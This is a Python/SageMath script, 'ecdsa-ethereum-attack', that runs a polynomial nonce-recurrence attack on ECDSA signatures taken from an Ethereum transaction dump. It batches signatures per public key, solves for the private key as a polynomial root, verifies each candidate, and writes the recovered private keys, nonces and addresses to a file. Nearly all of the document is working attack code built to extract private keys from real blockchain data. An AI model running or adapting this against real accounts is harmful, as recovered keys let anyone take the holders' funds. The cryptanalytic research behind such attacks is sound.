#!/usr/bin/env sage
import argparse
import datetime
import os
import sys
from concurrent.futures import ProcessPoolExecutor
from copy import deepcopy

import bitcoinlib
import ecdsa
import fastecdsa.keys
from sage.all import GF, PolynomialRing

usedcurve = ecdsa.curves.SECP256k1
g = usedcurve.generator
Z = GF(usedcurve.order)
R = PolynomialRing(Z, names=('dd',))
(dd,) = R._first_ngens(1)


def get_parser():
    parser = argparse.ArgumentParser(
        prog="ecdsa-ethereum-attack",
        description="Run the polynomial nonce recurrence attack on an Ethereum dataset."
    )
    parser.add_argument("--input", "-i", type=str, required=True,
                        help="Path to the input file. Must be a dump file in the format produced by ecdsa-dump-ethereum "
                             "and which has been sorted by public key and then by timestamp.",
                        dest="input_path")
    parser.add_argument("--output", "-o", type=str, required=True,
                        help="Path to the output file to dump to",
                        dest="output_path")
    parser.add_argument("-n", type=int, default=4,
                        help="Number of signatures per batch. N must be >= 4",
                        dest="n")
    parser.add_argument("--max-futures", type=int, default=25,
                        help="Maximum number of futures to process in a batch. "
                             "Increase this number if more cores are available.",
                        dest="max_futures")
    parser.add_argument("--no-sliding-window", default=False,
                        dest="no_sliding_window",
                        action="store_true",
                        help="Do not use a sliding window."
                             "Only use the first N signatures of each pubkey and discard the rest."
                             "Note that this will run faster but some vulnerable signatures may remain undetected")
    return parser


def get_file_size(file_path):
    bytes_count = os.path.getsize(file_path)
    return bytes_count


def approx_line_count(file_path):
    # if file is small enough, actually read whole file
    file_size = get_file_size(file_path)
    max_size = 1_000_000_000  # 1 GB

    if file_size <= max_size:
        with open(file_path) as f:
            for i, _ in enumerate(f):
                pass
        return i + 1

    # otherwise, do an approximation
    max_lines = 1000
    bytes_read = 0
    with open(file_path) as f:
        for i, line in enumerate(f):
            bytes_read += len(line)
            if i > max_lines:
                break
    read_lines = i + 1

    lines_per_byte = read_lines / bytes_read
    approx_lines = int(file_size * lines_per_byte)
    return approx_lines


def main():
    parser: argparse.ArgumentParser = get_parser()
    args = parser.parse_args()

    if args.n < 4:
        print("ERROR: N must be >= 4")
        sys.exit(-1)

    input_path = args.input_path
    output_path = args.output_path
    n = args.n
    total_lines = approx_line_count(input_path)

    print(f"Using N={args.n}")
    print(f"Total approx lines: {total_lines}")
    print(f"Sliding window: {not args.no_sliding_window}")

    executor = ProcessPoolExecutor()
    futures = []
    current_batch = []
    last_pubkey = None

    batch_count = 0
    line_count = 0
    start_time = datetime.datetime.utcnow()
    successful_attacks_count = 0
    total_pubkey_errors = 0

    with executor as ex:
        with open(input_path, "r") as f:
            for line in f:
                line_count += 1
                if line.startswith("#"):
                    header = line.strip()
                    print(header)
                    continue
                line = line.strip()
                fields = line.split(";")

                from_address, r, s, pubkey, txid, message_hash, block_timestamp = fields
                if last_pubkey is not None and pubkey != last_pubkey:
                    batch_size = len(current_batch)
                    if batch_size >= n:
                        sliding_start = 0
                        sliding_end = sliding_start + n

                        while sliding_end <= batch_size:
                            future = ex.submit(process_batch, deepcopy(current_batch[sliding_start:sliding_end]))
                            futures.append(future)

                            if len(futures) >= args.max_futures:
                                res = process_futures(batch_count,
                                                      futures,
                                                      line_count,
                                                      start_time,
                                                      successful_attacks_count,
                                                      total_lines,
                                                      total_pubkey_errors,
                                                      output_path,
                                                      args.max_futures)
                                batch_count, successful_attacks_count, total_pubkey_errors = res
                                futures.clear()

                            sliding_start += 1
                            sliding_end += 1
                            if args.no_sliding_window:
                                break

                    current_batch.clear()

                last_pubkey = pubkey
                current_batch.append(fields)

                if len(futures) >= args.max_futures:
                    res = process_futures(batch_count,
                                          futures,
                                          line_count,
                                          start_time,
                                          successful_attacks_count,
                                          total_lines,
                                          total_pubkey_errors,
                                          output_path,
                                          args.max_futures)
                    batch_count, successful_attacks_count, total_pubkey_errors = res
                    futures.clear()

        # also unstack futures at the end
        process_futures(batch_count,
                        futures,
                        line_count,
                        start_time,
                        successful_attacks_count,
                        total_lines,
                        total_pubkey_errors,
                        output_path,
                        args.max_futures,
                        show_stats=True)
        futures.clear()


def process_batch(current_batch):
    pubkey_read_errors = 0
    batch_size = len(current_batch)
    n = batch_size

    signatures = []
    hashes = []
    pubkeys = []
    txids = []
    block_timestamps = []

    for entry in current_batch:
        from_address, r, s, pubkey, txid, h, block_timestamp = entry

        try:
            r_int = int(r, 16)
            s_int = int(s, 16)
            pubkey = bitcoinlib.keys.Key(pubkey, is_private=False)
            signature = bitcoinlib.transactions.Signature(r_int, s_int)
            signatures.append(signature)
            hash_bytes = bytes.fromhex(h)
            if usedcurve.order.bit_length() < 256:
                hash_int = (int.from_bytes(hash_bytes, "big") >> (256 - usedcurve.order.bit_length())) % usedcurve.order
            else:
                hash_int = int.from_bytes(hash_bytes, "big") % usedcurve.order
            hashes.append(hash_int)
            pubkeys.append(pubkey)
            txids.append(txid)
            block_timestamps.append(block_timestamp)
        except bitcoinlib.keys.BKeyError as e:
            print(e)
            pubkey_read_errors += 1

    if pubkey_read_errors > 0:
        return None, pubkey_read_errors

    # perform attack
    first_pubkey = pubkeys[0]
    pubkey_address = from_address  # ethereum address
    d = do_attack(signatures, hashes, first_pubkey, n)
    if d is None:
        return None, pubkey_read_errors
    else:
        return d, first_pubkey, pubkey_address, txids[0], batch_size, signatures, hashes, block_timestamps


def process_futures(batch_count, futures, line_count, start_time, successful_attacks_count, total_lines,
                    total_pubkey_errors, output_path, max_futures, show_stats=False):
    for future in futures:
        result = future.result()
        success, pubkey_errors = process_result(result, output_path)
        batch_count += 1

        if success:
            successful_attacks_count += 1

        total_pubkey_errors += pubkey_errors

        if show_stats or batch_count % max_futures == 0:
            print_stats(batch_count, line_count, start_time, successful_attacks_count, total_lines, total_pubkey_errors)
    return batch_count, successful_attacks_count, total_pubkey_errors


def compute_nonces(d, signatures, hashes):
    rs = [sig.r for sig in signatures]
    ss = [sig.s for sig in signatures]
    ks = []
    for r, s, h in zip(rs, ss, hashes):
        # recover k value from this
        # we have d, r, s and h
        # k = (h + r * d) * s_inv
        s_inv = ecdsa.numbertheory.inverse_mod(s, usedcurve.order)
        k = ((h + r * d) * s_inv) % usedcurve.order
        ks.append(k)
    return ks


def process_result(result, output_path):
    if result[0] is not None:
        d, pubkey, pubkey_address, first_txid, batch_size, signatures, hashes, block_timestamps = result
        print("Successful attack!!")
        print(d)

        ks = compute_nonces(d, signatures, hashes)

        # dump result to file
        with open(output_path, "a+") as fout:
            outline = f"{d};{pubkey};{first_txid};{batch_size};{pubkey_address}"
            # append signatures and hashes
            for sig in signatures:
                outline += f";{sig.r}"
            for sig in signatures:
                outline += f";{sig.s}"
            for hash in hashes:
                outline += f";{hash}"
            for k in ks:
                outline += f";{k}"
            for bt in block_timestamps:
                outline += f";{bt}"
            outline += "\n"
            print(outline)
            fout.write(outline)

        return True, 0
    else:
        pubkey_errors = result[1]
        return False, pubkey_errors


def print_stats(batch_count, line_count, start_time, successful_attacks_count, total_lines, total_pubkey_errors):
    now = datetime.datetime.utcnow()
    elapsed = now - start_time
    lines_per_sec = round(line_count / elapsed.total_seconds(), 2)
    expected_total_time_seconds = int(total_lines / lines_per_sec)
    remaining_time = datetime.timedelta(seconds=expected_total_time_seconds)
    expected_finish_time = now + remaining_time
    progress_percentage = round(line_count / total_lines * 100, 2)

    print("Batches processed:", batch_count)
    print("Lines count:", line_count)
    print("Lines/s", lines_per_sec)
    print("Start time UTC:", start_time)
    print("Expected end time and date UTC", expected_finish_time)
    print("Successful attacks:", successful_attacks_count)
    print("Total pubkey errors:", total_pubkey_errors)
    print(f"Lines percentage: {progress_percentage}%")


def do_attack(signatures, hashes, pubkey, n):
    # get signature parameters as arrays
    s_inv = []
    s = []
    r = []
    for i in range(len(signatures)):
        s.append(signatures[i].s)
        r.append(signatures[i].r)
        s_inv.append(ecdsa.numbertheory.inverse_mod(s[i], usedcurve.order))

    # the polynomial we construct will have degree 1 + Sum_(i=1)^(i=N-3)i in dd
    # our task here is to compute this polynomial in a constructive way starting from the N signatures in the given list order
    # the generic formula will be given in terms of differences of nonces, i.e. k_ij = k_i - k_j where i and j are the signature indexes
    # each k_ij is a first-degree polynomial in dd
    # this function has the goal of returning it given i and j
    def k_ij_poly(i, j):
        hi = Z(hashes[i])
        hj = Z(hashes[j])
        s_invi = Z(s_inv[i])
        s_invj = Z(s_inv[j])
        ri = Z(r[i])
        rj = Z(r[j])
        poly = dd * (ri * s_invi - rj * s_invj) + hi * s_invi - hj * s_invj
        return poly

    # the idea is to compute the polynomial recursively from the given degree down to 0
    # the algorithm is as follows:
    # for 4 signatures the second degree polynomial is:
    # k_12*k_12 - k_23*k_01
    # so we can compute its coefficients.
    # the polynomial for N signatures has degree 1 + Sum_(i=1)^(i=N-3)i and can be derived from the one for N-1 signatures

    # let's define dpoly(i, j) recursively as the dpoly of degree i starting with index j

    def dpoly(n, i, j):
        if i == 0:
            return (k_ij_poly(j + 1, j + 2)) * (k_ij_poly(j + 1, j + 2)) - (k_ij_poly(j + 2, j + 3)) * (
                k_ij_poly(j + 0, j + 1))
        else:
            left = dpoly(n, i - 1, j)
            for m in range(1, i + 2):
                left = left * (k_ij_poly(j + m, j + i + 2))
            right = dpoly(n, i - 1, j + 1)
            for m in range(1, i + 2):
                right = right * (k_ij_poly(j, j + m))
            return (left - right)

    poly_target = dpoly(n - 4, n - 4, 0)

    # compute roots of the polynomial
    d_guesses = poly_target.roots()

    # check if the private key is among the roots
    for i in d_guesses:
        d = i[0]
        d = int(d)  # convert mpz to int

        vk = ecdsa.keys.VerifyingKey.from_public_point(g * d, curve=usedcurve)
        corresponding_pubkey_bytes = vk.to_pem().strip().hex()

        x, y = pubkey.public_point()
        point = fastecdsa.keys.Point(x, y, curve=fastecdsa.curve.secp256k1)
        pubkey_bytes = fastecdsa.keys.export_key(point).encode("ascii").strip().hex()

        if corresponding_pubkey_bytes == pubkey_bytes:
            # successful attack
            return d
    return None


if __name__ == '__main__':
    main()
